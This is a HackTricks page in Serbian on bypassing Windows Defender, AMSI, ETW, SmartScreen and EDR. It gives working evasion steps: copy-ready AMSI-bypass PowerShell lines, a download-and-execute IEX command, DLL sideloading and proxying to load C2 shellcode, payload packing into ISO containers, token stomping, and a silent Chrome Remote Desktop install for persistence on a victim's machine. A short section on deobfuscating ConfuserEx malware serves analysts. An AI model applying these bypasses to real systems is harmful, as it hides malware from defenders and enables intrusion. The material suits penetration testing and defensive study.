# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defender-a lažirajući drugi AV.
- [Onemogući Defender ako si administrator](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Trenutno, AV koriste različite metode za proveru da li je datoteka maliciozna ili ne, statičku detekciju, dinamičku analizu, i za naprednije EDR-ove, analizu ponašanja.

### **Statička detekcija**

Statička detekcija se postiže označavanjem poznatih malicioznih stringova ili nizova bajtova u binarnom fajlu ili skripti, kao i ekstrakcijom informacija iz same datoteke (npr. opis datoteke, ime kompanije, digitalni potpisi, ikona, kontrolna suma, itd.). To znači da korišćenje poznatih javnih alata može lakše dovesti do otkrivanja, jer su verovatno analizirani i označeni kao maliciozni. Postoji nekoliko načina da se zaobiđe ova vrsta detekcije:

- **Enkripcija**

Ako enkriptuješ binarni fajl, neće biti načina za AV da detektuje tvoj program, ali će ti biti potreban neki loader da dekriptuje i pokrene program u memoriji.

- **Obfuskacija**

Ponekad je sve što treba da uradiš da promeniš neke stringove u svom binarnom fajlu ili skripti da bi prošao AV, ali ovo može biti dugotrajan zadatak u zavisnosti od onoga što pokušavaš da obfuskiraš.

- **Prilagođeni alati**

Ako razviješ svoje alate, neće biti poznatih loših potpisa, ali ovo zahteva puno vremena i truda.

> [!TIP]
> Dobar način za proveru protiv statičke detekcije Windows Defender-a je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). U suštini deli datoteku na više segmenata i zatim traži od Defender-a da skenira svaki pojedinačno, na ovaj način, može ti reći tačno koji su označeni stringovi ili bajtovi u tvom binarnom fajlu.

Toplo preporučujem da pogledaš ovu [YouTube plejlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnoj AV Evasion.

### **Dinamička analiza**

Dinamička analiza je kada AV pokreće tvoj binarni fajl u sandbox-u i prati malicioznu aktivnost (npr. pokušaj dekripcije i čitanja lozinki iz tvog pretraživača, izvođenje minidump-a na LSASS, itd.). Ovaj deo može biti malo teži za rad, ali evo nekoliko stvari koje možeš uraditi da izbegneš sandbox-e.

- **Spavanje pre izvršenja** U zavisnosti od toga kako je implementirano, može biti odličan način za zaobilaženje dinamičke analize AV-a. AV-ima je potrebno vrlo malo vremena da skeniraju datoteke kako ne bi ometali rad korisnika, tako da korišćenje dugih perioda spavanja može ometati analizu binarnih fajlova. Problem je što mnogi AV-ovi sandbox-i mogu jednostavno preskočiti spavanje u zavisnosti od toga kako je implementirano.
- **Proveravanje resursa mašine** Obično sandbox-i imaju vrlo malo resursa za rad (npr. < 2GB RAM), inače bi mogli usporiti korisničku mašinu. Takođe možeš biti veoma kreativan ovde, na primer, proveravajući temperaturu CPU-a ili čak brzine ventilatora, ne mora sve biti implementirano u sandbox-u.
- **Provere specifične za mašinu** Ako želiš da ciljaš korisnika čija je radna stanica pridružena "contoso.local" domenu, možeš izvršiti proveru na domen mašine da vidiš da li se poklapa sa onim što si naveo, ako se ne poklapa, možeš naterati svoj program da se zatvori.

Ispostavlja se da je ime računara Microsoft Defender-ovog Sandbox-a HAL9TH, tako da možeš proveriti ime računara u svom malveru pre detonacije, ako se ime poklapa sa HAL9TH, to znači da si unutar Defender-ovog sandbox-a, tako da možeš naterati svoj program da se zatvori.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Neki drugi zaista dobri saveti od [@mgeeky](https://twitter.com/mariuszbit) za borbu protiv sandbox-a

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanal</p></figcaption></figure>

Kao što smo rekli ranije u ovom postu, **javni alati** će na kraju **biti otkriveni**, tako da bi trebao da se zapitaš nešto:

Na primer, ako želiš da dump-uješ LSASS, **da li ti zaista treba da koristiš mimikatz**? Ili bi mogao da koristiš neki drugi projekat koji je manje poznat i takođe dump-uje LSASS.

Pravi odgovor je verovatno potonji. Uzimajući mimikatz kao primer, verovatno je jedan od, ako ne i najviše označenih malvera od strane AV-a i EDR-a, dok je projekat sam po sebi super cool, takođe je noćna mora raditi s njim da bi se zaobišli AV-ovi, tako da samo potraži alternative za ono što pokušavaš da postigneš.

> [!TIP]
> Kada modifikuješ svoje payload-e za evaziju, obavezno **isključi automatsko slanje uzoraka** u Defender-u, i molim te, ozbiljno, **NE ULAZI NA VIRUSTOTAL** ako ti je cilj postizanje evazije na duže staze. Ako želiš da proveriš da li tvoj payload biva otkriven od strane određenog AV-a, instaliraj ga na VM, pokušaj da isključiš automatsko slanje uzoraka, i testiraj ga tamo dok ne budeš zadovoljan rezultatom.

## EXEs vs DLLs

Kad god je to moguće, uvek **prioritizuj korišćenje DLL-ova za evaziju**, iz mog iskustva, DLL fajlovi su obično **mnogo manje otkriveni** i analizirani, tako da je to veoma jednostavan trik za korišćenje kako bi se izbeglo otkrivanje u nekim slučajevima (ako tvoj payload ima neki način da se pokrene kao DLL naravno).

Kao što možemo videti na ovoj slici, DLL payload iz Havoc-a ima stopu detekcije od 4/26 na antiscan.me, dok EXE payload ima stopu detekcije od 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me poređenje normalnog Havoc EXE payload-a vs normalnog Havoc DLL-a</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možeš koristiti sa DLL fajlovima da bi bio mnogo neprimetniji.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi prednost reda pretrage DLL-a koji koristi loader tako što postavlja i aplikaciju žrtve i maliciozni payload zajedno.

Možeš proveriti programe podložne DLL Sideloading-u koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell skript:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će prikazati listu programa podložnih DLL hijackingu unutar "C:\Program Files\\" i DLL datoteka koje pokušavaju da učitaju.

Toplo preporučujem da **istražite DLL hijackable/sideloadable programe sami**, ova tehnika je prilično suptilna kada se pravilno izvede, ali ako koristite javno poznate DLL sideloadable programe, lako možete biti uhvaćeni.

Samo postavljanje malicioznog DLL-a sa imenom koje program očekuje da učita, neće učitati vaš payload, jer program očekuje neke specifične funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku nazvanu **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program pravi iz proxy (i malicioznog) DLL-a ka originalnom DLL-u, čime se očuvava funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 fajla: šablon izvorne koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Oba naša shellcode (kodiran sa [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloadingu, kao i [ippsecov video](https://www.youtube.com/watch?v=3eROsG_WNpE) da biste saznali više o onome što smo detaljnije razgovarali.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je alat za isporuku za zaobilaženje EDR-a koristeći suspendovane procese, direktne syscalls i alternativne metode izvršavanja`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na diskretan način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Izbegavanje je samo igra mačke i miša, ono što danas funkcioniše može biti otkriveno sutra, tako da nikada ne oslanjajte se samo na jedan alat, ako je moguće, pokušajte da povežete više tehnika izbegavanja.

## AMSI (Interfejs za skeniranje protiv malvera)

AMSI je stvoren da spreči "[malver bez datoteka](https://en.wikipedia.org/wiki/Fileless_malware)". U početku, AV-ovi su mogli da skeniraju samo **datoteke na disku**, tako da ako biste nekako mogli da izvršite terete **direktno u memoriji**, AV nije mogao ništa da učini da to spreči, jer nije imao dovoljno uvida.

AMSI funkcija je integrisana u ove komponente Windows-a.

- Kontrola korisničkog naloga, ili UAC (povećanje privilegija EXE, COM, MSI, ili ActiveX instalacije)
- PowerShell (skripte, interaktivna upotreba i dinamička evaluacija koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Omogućava antivirusnim rešenjima da ispituju ponašanje skripti izlažući sadržaj skripti u formi koja je i nekriptovana i neobfuskovana.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` će proizvesti sledeću upozorenje na Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Primetite kako dodaje `amsi:` i zatim putanju do izvršne datoteke iz koje je skripta pokrenuta, u ovom slučaju, powershell.exe

Nismo spustili nijednu datoteku na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI-ja.

Štaviše, počevši od **.NET 4.8**, C# kod se takođe izvršava kroz AMSI. Ovo čak utiče na `Assembly.Load(byte[])` za učitavanje u memorijskoj izvršavanju. Zato se preporučuje korišćenje nižih verzija .NET-a (kao što su 4.7.2 ili niže) za izvršavanje u memoriji ako želite da izbegnete AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuskacija**

Pošto AMSI uglavnom radi sa statičkim detekcijama, stoga, modifikovanje skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima sposobnost da neobfuskira skripte čak i ako imaju više slojeva, tako da obfuskacija može biti loša opcija u zavisnosti od načina na koji je urađena. Ovo čini izbegavanje ne tako jednostavnim. Ipak, ponekad, sve što treba da uradite je da promenite nekoliko imena promenljivih i bićete u redu, tako da zavisi koliko je nešto označeno.

- **AMSI Bypass**

Pošto je AMSI implementiran učitavanjem DLL-a u proces powershell-a (takođe cscript.exe, wscript.exe, itd.), moguće je lako manipulisati njime čak i kada se pokreće kao korisnik bez privilegija. Zbog ove greške u implementaciji AMSI, istraživači su pronašli više načina da izbegnu AMSI skeniranje.

**Prisiljavanje na grešku**

Prisiljavanje AMSI inicijalizacije da ne uspe (amsiInitFailed) rezultira time da se nijedno skeniranje neće pokrenuti za trenutni proces. Prvobitno je ovo otkrio [Matt Graeber](https://twitter.com/mattifestation) i Microsoft je razvio potpis da spreči širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Sve što je bilo potrebno je jedna linija powershell koda da se AMSI učini neupotrebljivim za trenutni powershell proces. Ova linija je naravno označena od strane AMSI-a, tako da su potrebne neke modifikacije da bi se koristila ova tehnika.

Evo modifikovanog AMSI bypass-a koji sam uzeo iz ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti označeno kada ovaj post bude objavljen, pa ne biste trebali objavljivati bilo koji kod ako je vaš plan da ostanete neotkriveni.

**Memory Patching**

Ova tehnika je prvobitno otkrivena od strane [@RastaMouse](https://twitter.com/_RastaMouse/) i uključuje pronalaženje adrese za funkciju "AmsiScanBuffer" u amsi.dll (odgovornu za skeniranje korisnički unetih podataka) i prepisivanje sa instrukcijama da vrati kod za E_INVALIDARG, na ovaj način, rezultat stvarnog skeniranja će vratiti 0, što se tumači kao čist rezultat.

> [!TIP]
> Molimo vas da pročitate [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoji mnogo drugih tehnika koje se koriste za zaobilaženje AMSI sa PowerShell-om, pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

Ovaj alat [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) takođe generiše skriptu za zaobilaženje AMSI.

**Remove the detected signature**

Možete koristiti alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da uklonite otkrivenu AMSI potpis iz memorije trenutnog procesa. Ovaj alat radi tako što skenira memoriju trenutnog procesa za AMSI potpis i zatim ga prepisuje sa NOP instrukcijama, efikasno ga uklanjajući iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Možete pronaći listu AV/EDR proizvoda koji koriste AMSI na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Ako koristite PowerShell verziju 2, AMSI neće biti učitan, tako da možete pokretati svoje skripte bez skeniranja od strane AMSI. Možete to uraditi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcija koja vam omogućava da beležite sve PowerShell komande izvršene na sistemu. Ovo može biti korisno za reviziju i rešavanje problema, ali može biti i **problem za napadače koji žele da izbegnu otkrivanje**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Onemogućite PowerShell transkripciju i logovanje modula**: Možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) u tu svrhu.
- **Koristite PowerShell verziju 2**: Ako koristite PowerShell verziju 2, AMSI neće biti učitan, tako da možete pokrenuti svoje skripte bez skeniranja od strane AMSI. Možete to uraditi: `powershell.exe -version 2`
- **Koristite unmanaged PowerShell sesiju**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da pokrenete PowerShell bez odbrambenih mehanizama (to je ono što `powerpick` iz Cobalt Strike koristi).

## Obfuscation

> [!TIP]
> Nekoliko tehnika obfuskacije oslanja se na enkripciju podataka, što će povećati entropiju binarnog fajla, što će olakšati AV-ima i EDR-ima da ga otkriju. Budite oprezni s tim i možda primenite enkripciju samo na specifične delove vašeg koda koji su osetljivi ili treba da budu skriveni.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Kada analizirate malver koji koristi ConfuserEx 2 (ili komercijalne forkove), uobičajeno je suočiti se sa nekoliko slojeva zaštite koji će blokirati dekompilatore i sandboxes. Radni tok ispod pouzdano **obnavlja skoro originalni IL** koji se može dekompilirati u C# u alatima kao što su dnSpy ili ILSpy.

1.  Uklanjanje anti-tampering zaštite – ConfuserEx enkriptuje svaki *telo metode* i dekriptuje ga unutar *modula* statičkog konstruktora (`<Module>.cctor`). Ovo takođe patch-uje PE checksum, tako da će svaka modifikacija srušiti binarni fajl. Koristite **AntiTamperKiller** da locirate enkriptovane tabele metapodataka, povratite XOR ključeve i prepišete čistu asambliju:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Izlaz sadrži 6 anti-tampering parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni prilikom izrade vlastitog dekompilatora.

2.  Obnova simbola / kontrolnog toka – prosledite *čisti* fajl **de4dot-cex** (ConfuserEx-svesni fork de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Zastavice:
• `-p crx` – izaberite ConfuserEx 2 profil
• de4dot će poništiti izravnavanje kontrolnog toka, obnoviti originalne prostore imena, klase i imena varijabli i dekriptovati konstantne stringove.

3.  Uklanjanje proxy poziva – ConfuserEx zamenjuje direktne pozive metoda sa laganim omotačima (poznatim kao *proxy pozivi*) kako bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebali biste primetiti normalne .NET API-je kao što su `Convert.FromBase64String` ili `AES.Create()` umesto neprozirnih funkcija omotača (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite rezultantni binarni fajl pod dnSpy, pretražite velike Base64 blobove ili `RijndaelManaged`/`TripleDESCryptoServiceProvider` upotrebu da locirate *pravi* payload. Često malver skladišti kao TLV-enkodiranu bajt niz inicijalizovan unutar `<Module>.byte_0`.

Gore navedeni lanac obnavlja tok izvršenja **bez** potrebe da se pokrene zlonamerni uzorak – korisno kada radite na offline radnoj stanici.

> 🛈  ConfuserEx proizvodi prilagođeni atribut nazvan `ConfusedByAttribute` koji se može koristiti kao IOC za automatsko triiranje uzoraka.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) kompilacione suite koja može da pruži povećanu sigurnost softvera kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštitu od neovlašćenih izmena.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako koristiti `C++11/14` jezik za generisanje, u vreme kompilacije, obfuskovanog koda bez korišćenja bilo kog spoljnog alata i bez modifikovanja kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskovanih operacija generisanih C++ template metaprograming okvirom koji će otežati život osobi koja želi da provali aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binarni obfuscator koji može da obfuskira različite pe fajlove uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorfni kod motor za proizvoljne izvršne fajlove.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je okvir za obfuskaciju koda sa finim granicama za jezike podržane od strane LLVM koristeći ROP (programiranje orijentisano na povratak). ROPfuscator obfuskira program na nivou asembler koda transformišući obične instrukcije u ROP lance, ometajući naše prirodno shvatanje normalnog toka kontrole.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nimu.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL u shellcode i zatim ih učita.

## SmartScreen & MoTW

Možda ste videli ovaj ekran kada ste preuzimali neke izvršne fajlove sa interneta i izvršavali ih.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno malicioznih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom funkcioniše na osnovu reputacije, što znači da će neobično preuzeti aplikacije aktivirati SmartScreen, upozoravajući i sprečavajući krajnjeg korisnika da izvrši fajl (iako se fajl i dalje može izvršiti klikom na Više informacija -> Pokreni u svakom slučaju).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa imenom Zone.Identifier koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kojeg je preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Proveravanje Zone.Identifier ADS za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani **pouzdanom** potpisnom sertifikatom **neće aktivirati SmartScreen**.

Veoma efikasan način da sprečite svoje payload-e da dobiju Mark of The Web je pakovanje unutar nekog oblika kontejnera kao što je ISO. To se dešava zato što Mark-of-the-Web (MOTW) **ne može** biti primenjen na **non NTFS** volumene.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Primer korišćenja:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logovanje u Windows-u koji omogućava aplikacijama i sistemskim komponentama da **beleže događaje**. Međutim, može se koristiti i od strane bezbednosnih proizvoda za praćenje i otkrivanje zlonamernih aktivnosti.

Slično tome kako je AMSI onemogućen (zaobiđen), takođe je moguće učiniti da **`EtwEventWrite`** funkcija korisničkog prostora odmah vrati bez beleženja bilo kakvih događaja. To se postiže patch-ovanjem funkcije u memoriji da odmah vrati, efikasno onemogućavajući ETW logovanje za taj proces.

Možete pronaći više informacija na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Učitavanje C# binarnih datoteka u memoriju je poznato već neko vreme i još uvek je veoma dobar način za pokretanje vaših alata nakon eksploatacije bez da vas uhvate AV.

Pošto će se payload učitati direktno u memoriju bez dodirivanja diska, moraćemo se brinuti samo o patch-ovanju AMSI za ceo proces.

Većina C2 okvira (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već pruža mogućnost izvršavanja C# assembly-a direktno u memoriji, ali postoje različiti načini za to:

- **Fork\&Run**

Ovo uključuje **pokretanje novog žrtvenog procesa**, injektovanje vašeg zlonamernog koda u taj novi proces, izvršavanje vašeg zlonamernog koda i kada završite, ubijanje novog procesa. Ovo ima svoje prednosti i nedostatke. Prednost metode fork and run je u tome što se izvršavanje dešava **izvan** našeg Beacon implant procesa. To znači da ako nešto u našoj akciji nakon eksploatacije pođe po zlu ili bude uhvaćeno, postoji **mnogo veća šansa** da naš **implant preživi.** Nedostatak je u tome što imate **veću šansu** da budete uhvaćeni od strane **Behavioral Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o injektovanju zlonamernog koda nakon eksploatacije **u sopstveni proces**. Na ovaj način, možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV, ali nedostatak je u tome što ako nešto pođe po zlu sa izvršavanjem vašeg payload-a, postoji **mnogo veća šansa** da **izgubite svoj beacon** jer bi mogao da se sruši.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o učitavanju C# Assembly-a, molimo vas da pogledate ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Takođe možete učitati C# Assembly-e **iz PowerShell-a**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t-ov video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršiti zlonamerni kod koristeći druge jezike dajući kompromitovanoj mašini pristup **okruženju interpreter-a instaliranom na SMB deljenju pod kontrolom napadača**.

Omogućavanjem pristupa Interpreter Binaries i okruženju na SMB deljenju možete **izvršiti proizvoljan kod u ovim jezicima unutar memorije** kompromitovane mašine.

Repozitorijum ukazuje: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti da zaobiđemo statične potpise**. Testiranje sa nasumičnim neobfuskovanim reverse shell skriptama u ovim jezicima se pokazalo uspešnim.

## TokenStomping

Token stomping je tehnika koja omogućava napadaču da **manipuliše pristupnim tokenom ili bezbednosnim proizvodom kao što su EDR ili AV**, omogućavajući im da smanje privilegije tako da proces ne umre, ali neće imati dozvole da proverava zlonamerne aktivnosti.

Da bi se to sprečilo, Windows bi mogao **sprečiti spoljne procese** da dobiju handle-ove nad tokenima bezbednosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je jednostavno instalirati Chrome Remote Desktop na žrtvinom računaru i zatim ga koristiti za preuzimanje kontrole i održavanje postojanosti:
1. Preuzmite sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", a zatim kliknite na MSI datoteku za Windows da preuzmete MSI datoteku.
2. Pokrenite instalater tiho na žrtvi (potrebna je administrativna dozvola): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop i kliknite na sledeće. Čarobnjak će vas zatim pitati da autorizujete; kliknite na dugme Autorize da nastavite.
4. Izvršite dati parametar sa nekim prilagođavanjima: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Obratite pažnju na pin parametar koji omogućava postavljanje pina bez korišćenja GUI).

## Advanced Evasion

Evasija je veoma komplikovana tema, ponekad morate uzeti u obzir mnoge različite izvore telemetrije u samo jednom sistemu, tako da je praktično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje protiv kojeg se borite imaće svoje snage i slabosti.

Toplo vas savetujem da pogledate ovaj govor od [@ATTL4S](https://twitter.com/DaniLJ94), kako biste stekli uvid u napredne tehnike evasije.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe još jedan sjajan govor od [@mariuszbit](https://twitter.com/mariuszbit) o Evasiji u dubini.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **ukloniti delove binarne datoteke** dok ne **otkrije koji deo Defender** smatra zlonamernim i podeliti ga sa vama.\
Drugi alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa otvorenom web stranicom koja nudi uslugu na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

